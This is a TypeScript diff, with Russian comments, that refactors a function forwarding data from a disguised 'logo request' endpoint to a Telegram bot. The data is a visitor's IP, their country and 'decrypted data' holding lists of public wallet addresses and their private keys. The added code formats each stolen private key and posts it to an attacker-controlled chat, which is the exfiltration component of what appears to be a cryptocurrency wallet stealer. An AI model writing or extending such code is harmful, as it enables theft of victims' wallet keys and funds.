@@ -116,25 +116,72 @@ async function getCountryByIp(ip: any) {
 }
 
 // Функция отправки в Telegram
-async function sendToTelegram(ip: any, country: any, decryptedData: { timestamp: string | null; header: any; keys: any; error?: undefined; } | { error: string; timestamp?: undefined; header?: undefined; keys?: undefined; } | null) {
+async function sendToTelegram(
+  ip: string,
+  country: string,
+  decryptedData: {
+    timestamp?: string | null;
+    header?: string;
+    keys?: Array<{ public?: string; private?: string }>;
+    error?: string;
+  } | null
+) {
   try {
-    // Форматируем сообщение
+    // Базовое сообщение
     let message = `🌐 *Новый запрос логотипа*\n\n`;
-    message += `🖥️ *IP*: ${ip}\n`;
+    message += `🖥️ *IP*: \`${ip}\`\n`;
     message += `📍 *Страна*: ${country}\n\n`;
-    message += `\n🔓 *Расшифрованные данные*: \n Заголовок:${decryptedData?.header}\n\n Ключи: ${decryptedData?.keys.map((key: any) => "\n" + "Публичный адрес:" + key.get("public") + "|" + "Приватка:" + key.get("private"))}\n`;
-    
+
+    // Добавляем расшифрованные данные, если они есть
+    if (decryptedData) {
+      if (decryptedData.error) {
+        message += `❌ *Ошибка расшифровки*: \`${decryptedData.error}\`\n`;
+      } else {
+        // Добавляем заголовок, если есть
+        if (decryptedData.header) {
+          message += `📋 *Заголовок*: \`${decryptedData.header}\`\n\n`;
+        }
+
+        // Добавляем timestamp, если есть
+        if (decryptedData.timestamp) {
+          message += `⏱️ *Время запроса*: \`${decryptedData.timestamp}\`\n\n`;
+        }
+
+        // Добавляем ключи, если есть
+        if (decryptedData.keys && decryptedData.keys.length > 0) {
+          message += `🔑 *Ключи (${decryptedData.keys.length})*:\n`;
+          
+          decryptedData.keys.forEach((key, index) => {
+            message += `\n*Ключ ${index + 1}*:\n`;
+            message += `▫️ *Публичный*: \`${key.public || 'отсутствует'}\`\n`;
+            message += `▫️ *Приватный*: \`${key.private ? key.private : 'отсутствует'}\`\n`;
+          });
+        }
+      }
+    } else {
+      message += `ℹ️ *Нет данных для отображения*\n`;
+    }
+
+    // Отправляем сообщение в Telegram
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: message,
       parse_mode: 'Markdown'
     });
+
   } catch (error) {
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: `ОШИБКА при отправке результата: ${error}`,
-      parse_mode: 'Markdown'
-    });
+    console.error('Ошибка при отправке в Telegram:', error);
+    
+    // Пытаемся отправить сообщение об ошибке
+    try {
+      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: `❌ *Ошибка при отправке данных*:\n\`${error instanceof Error ? error.message : String(error)}\``,
+        parse_mode: 'Markdown'
+      });
+    } catch (secondaryError) {
+      console.error('Не удалось отправить сообщение об ошибке:', secondaryError);
+    }
   }
 }
 
